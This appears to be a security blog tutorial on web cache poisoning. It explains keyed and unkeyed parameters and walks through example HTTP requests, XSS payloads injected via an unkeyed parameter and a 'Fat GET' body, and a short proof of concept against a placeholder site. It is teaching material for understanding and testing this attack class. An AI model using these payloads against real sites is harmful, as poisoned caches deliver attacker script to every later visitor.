---
title: "Introduction to Cache Poisoning Attacks"
date: 2025-02-19
draft: false
description: "Introduction into Cache Poisoning Attacks"
tags: ["Cache Poisoning", "Guide"]
---
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">


## <i class="fa-solid fa-worm text-primary-400"></i> Terminology

### Keyed Parameters
<span class="text-primary-400">Keyed parameters</span> are parameters that the cache system considers when storing and retrieving cached content. This means that <span class="text-primary-400">variations in these parameters will result in different cached entries</span>.

For example, if the URL has parameters such as `?user=123` and the cache is <span class="text-primary-400 font-bold">keyed</span> on this parameter, the cache will <span class="text-primary-400">store and serve different content</span>  (<span class="text-primary-400 font-bold">cache miss</span>) for `?user=123` and `?user=456`.

### Unkeyed Parameters
<span class="text-primary-400">Unkeyed parameters</span> are parameters that the cache system ignores when storing and retrieving cached content. This means that <span class="text-primary-400">variations in these parameters will not result in different cached entries</span>. The cache will store only one version of the content (<span class="text-primary-400 font-bold">cache hit</span>), regardless of the variations in these parameters.

## <i class="fa-solid fa-magnifying-glass text-primary-400"></i> Identifying Unkeyed Parameters
The first step is to <span class="text-primary-400">identify unkeyed parameters</span>, since keyed parameters need to be the same when the victim accesses the resource.

### Example
Assume we open `example.com` on `/page` with the following parameters:

```HTTP
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com
```

Since `example.com` uses caching and we are visiting the page for the first time, we will see a cache `MISS`:

{{< highlight HTTP "linenos=false,hl_lines=4" >}}
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
  <head>
    <title>Welcome</title>
  </head>

  <body>
    <p>Welcome, admin!</p>
  </body>
</html>
{{< /highlight >}}

Now we <span class="text-primary-400">alter each parameter and check weather we get a cache miss or hit</span>. A cache `MISS` indicates us that this parameter is <span class="text-primary-400">keyed</span>, since the server loaded a new version of the website.

```HTTP
GET /page?user=guest&tracking=abc HTTP/1.1
Host: example.com
```

{{< highlight HTTP "linenos=false,hl_lines=4 12" >}}
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
  <head>
    <title>Welcome</title>
  </head>

  <body>
    <p>Welcome, guest!</p>
  </body>
</html>
{{< /highlight >}}

Now that we identified the <span class="text-primary-400">user parameter to be keyed</span>, let’s continue and check the tracking parameter. Before we change the tracking parameter, lets resent our initial request where we got a cache `MISS`, to verify that the sytem now cached it.

```HTTP
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com
```

{{< highlight HTTP "linenos=false,hl_lines=4 12" >}}
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 456
X-Cache: HIT

<html>
  <head>
    <title>Welcome</title>
  </head>

  <body>
    <p>Welcome, admin!</p>
  </body>
</html>
{{< /highlight >}}

Great. Now, let's alter the value of the tracking parameter to see whether we get a cache `MISS`, indicating a keyed parameter, or a `HIT` again, indicating an unkeyed parameter.

```HTTP
GET /page?user=admin&tracking=some-other-value HTTP/1.1
Host: example.com
```

{{< highlight HTTP "linenos=false,hl_lines=4 12" >}}
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 456
X-Cache: HIT

<html>
  <head>
    <title>Welcome</title>
  </head>

  <body>
    <p>Welcome, admin!</p>
  </body>
</html>
{{< /highlight >}}

We can observe the tracking parameter must be a <span class="text-primary-400">unkeyed value</span>, since the cache always returns HIT, even though the value of the parameter was changed.

> The same thing also sometimes applies to header values in the HTTP requests.

## <i class="fa-solid fa-bullseye text-primary-400"></i> Exploitation
One of the <span class="text-primary-400">most common ways to exploit cache poisoning is through XSS</span>, though there are other attacks like DoS and unkeyed cookies. To exploit a XSS you have to <span class="text-primary-400">find an injection point using an unkeyed parameter</span>. The XSS will then be severed to all other users loading that cached version.

### Example
Imagine we have an injection via the tracking parameter into a meta tag like this:

```HTTP
GET /page?user=admin&tracking=https://mytrack.com HTTP/1.1
```

```HTML
...
<meta http-equiv="refresh" content="https://mytrack.com" />
...
```

As before, when sending the initial request to the server, we will receive a cache MISS. So let us inject a simple XSS payload via the unkeyed tracking parameter `"><img/src/onerror=print()>`.

{{< highlight HTML "linenos=false,hl_lines=3 8" >}}
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
  <head>
    <title>Welcome</title>
    <meta http-equiv="refresh" content="https://"><img/src/onerror=print()> />
  </head>

  <body>
    <p>Welcome, admin!</p>
  </body>
</html>
{{< /highlight >}}

Since <span class="text-primary-400">tracking is an unkeyed parameter</span>, anybody who visits the page `/page?user=admin` will be a victim of the XSS attack.


## <i class="fa-solid fa-user-ninja text-primary-400"></i> Advanced Techniques
There are multiple advanced things we can try to get and escalate a cache poisoning attack. However for now let us focus one just one of those, a <span class="text-primary-400">"Fat GET"</span>.

### Fat GET
A "Fat GET" request, is when <span class="text-primary-400">we use GET parameters in the post body, while still using the GET verb</span>. If a server is misconfigured it might parse the parameters from the body. With this you can try to create a discrepancy between the webserver and the cache. <span class="text-primary-400">With this we can also use keyed parameters, since they are no longer directly present in the URL</span>. We can then go back and perform an XSS attack the same way we did before.

{{< highlight HTTP "linenos=false,hl_lines=4" >}}
GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com

user=guest
{{< /highlight >}}

{{< highlight HTML "linenos=false,hl_lines=11" >}}
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
  <head>
    <title>Welcome</title>
  </head>

  <body>
    <p>Welcome, guest!</p>
  </body>
</html>
{{< /highlight >}}

{{< highlight HTTP "linenos=false,hl_lines=4" >}}

GET /page?user=admin&tracking=abc HTTP/1.1
Host: example.com

user=</p><img/src/onerror=print()><p>
{{< /highlight >}}

{{< highlight HTML "linenos=false,hl_lines=11" >}}
Content-Type: text/html
Content-Length: 456
X-Cache: MISS

<html>
  <head>
    <title>Welcome</title>
  </head>

  <body>
    <p>Welcome, </p><img/src/onerror=print()><p>!</p>
  </body>
</html>
{{< /highlight >}}

Again, if a victim now opens `example.com/page?user=admin` the XSS will be loaded from the cache.

## <i class="fa-solid fa-book text-primary-400"></i> A Real Life PoC
```HTTP
GET /?cb=100&"><image/src/onerror=print()> HTTP/2
Host: target-website.com
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36

HTTP/2 200 OK
CACHE: HIT
```

```HTML
...
<meta property="og:url" content="https://target-website.com/?cb=100&"><image/src/onerror=print()>">
...
```

In this example, an image tag with an `onerror` event is injected into the URL parameter. When the server processes this request, the parameter is reflected in the HTML response and cached. Consequently, subsequent users requesting the cached page will execute the malicious JavaScript.